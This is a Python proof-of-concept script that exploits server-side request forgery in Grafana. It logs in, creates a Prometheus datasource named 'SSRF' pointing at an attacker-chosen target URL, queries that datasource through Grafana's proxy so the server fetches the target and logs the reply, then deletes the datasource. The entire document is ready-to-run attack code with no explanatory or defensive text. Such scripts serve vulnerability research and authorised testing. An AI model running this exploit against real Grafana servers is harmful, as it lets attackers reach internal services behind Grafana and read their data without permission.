import requests
import json
import logging
import sys
import argparse
from datetime import datetime
from getpass import getpass
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'poc_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class POC:
    def __init__(self, url: str):
        """
        Initialize POC with URL.
        URL can be with or without protocol (e.g., 'http://example.com' or 'example.com')
        """
        if not url.startswith(('http://', 'https://')):
            self.base_url = f"http://{url}"
        else:
            self.base_url = url

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json'
        })

    def login(self, username: str, password: str) -> bool:
        """
        Login to Grafana using username and password
        """
        try:
            endpoint = f"{self.base_url}/login"
            data = {
                "user": username,
                "password": password
            }

            response = self.session.post(endpoint, json=data)

            if response.ok:
                logger.info("Successfully logged in to Grafana")
                return True
            else:
                logger.error(f"Login failed. Status: {response.status_code}")
                logger.error(f"Response body: {response.text}")
                return False

        except Exception as e:
            logger.error(f"Exception during login: {str(e)}")
            return False

    def create_grafana_datasource(self, target_url: str, json_data: Optional[str] = None) -> bool:
        """
        Create Grafana datasource with SSRF payload.
        """
        try:
            endpoint = f"{self.base_url}/api/datasources"

            data = {
                "uid": "ssrf",
                "orgId": 1,
                "name": "SSRF",
                "type": "prometheus",
                "access": "proxy",
                "url": target_url,
                "user": "",
                "database": "",
                "basicAuth": False,
                "basicAuthUser": "",
                "withCredentials": False,
                "isDefault": False,
                "jsonData": {
                    "httpMethod": "POST" if json_data else "GET",
                    "timeInterval": "30s",
                },
                "secureJsonFields": {},
                "version": 3,
                "readOnly": False,
                "accessControl": {
                    "alert.instances.external:read": True,
                    "alert.instances.external:write": True,
                    "alert.notifications.external:read": True,
                    "alert.notifications.external:write": True,
                    "alert.rules.external:read": True,
                    "alert.rules.external:write": True,
                    "datasources.id:read": True,
                    "datasources:delete": True,
                    "datasources:query": True,
                    "datasources:read": True,
                    "datasources:write": True
                }
            }

            if json_data:
                data["jsonData"]["customQueryParameters"] = json_data

            response = self.session.post(endpoint, json=data)

            if response.ok:
                logger.info("Successfully created Grafana datasource")
                logger.info(f"Using HTTP {data['jsonData']['httpMethod']} method")
                return True
            else:
                logger.error(f"Failed to create datasource. Status: {response.status_code}")
                logger.error(f"Response body: {response.text}")
                return False

        except Exception as e:
            logger.error(f"Exception while creating datasource: {str(e)}")
            return False

    def query_datasource(self) -> bool:
        """
        Query the created datasource and log the response.
        """
        try:
            endpoint = f"{self.base_url}/api/datasources/uid/ssrf/resources/"

            response = self.session.get(endpoint)

            if response.ok:
                try:
                    response_json = response.json()
                    minified = json.dumps(response_json, separators=(',', ':'))
                    logger.info(f"Datasource response: {minified}")
                    return True
                except json.JSONDecodeError:
                    logger.error("Failed to parse response as JSON")
                    logger.info(f"Raw response: {response.text}")
                    return False
            else:
                logger.error(f"Failed to query datasource. Status: {response.status_code}")
                logger.error(f"Response body: {response.text}")
                return False

        except Exception as e:
            logger.error(f"Exception while querying datasource: {str(e)}")
            return False

    def delete_datasource(self) -> bool:
        """
        Delete the created datasource.
        """
        try:
            endpoint = f"{self.base_url}/api/datasources/uid/ssrf"

            response = self.session.delete(endpoint)

            if response.ok:
                logger.info("Successfully deleted datasource")
                return True
            else:
                logger.error(f"Failed to delete datasource. Status: {response.status_code}")
                logger.error(f"Response body: {response.text}")
                return False

        except Exception as e:
            logger.error(f"Exception while deleting datasource: {str(e)}")
            return False

def parse_arguments():
    parser = argparse.ArgumentParser(description='Grafana SSRF PoC Script')
    parser.add_argument('--username', required=True, help='Username for authentication')
    parser.add_argument('--url', required=True, help='Target Grafana URL')
    parser.add_argument('--target', required=True, help='Target URL for SSRF test')
    parser.add_argument('--data', help='JSON data for customQueryParameters')
    return parser.parse_args()

def main():
    args = parse_arguments()
    password = getpass("Enter password: ")
    poc = POC(args.url)

    if not poc.login(args.username, password):
        logger.error("Authentication failed")
        sys.exit(1)

    if not poc.create_grafana_datasource(args.target, args.data):
        logger.error("Failed to create Grafana datasource")
        sys.exit(1)

    if not poc.query_datasource():
        logger.error("Failed to query datasource")

    if not poc.delete_datasource():
        logger.error("Failed to delete datasource")
        sys.exit(1)

    logger.info("All operations completed successfully")

if __name__ == "__main__":
    main()
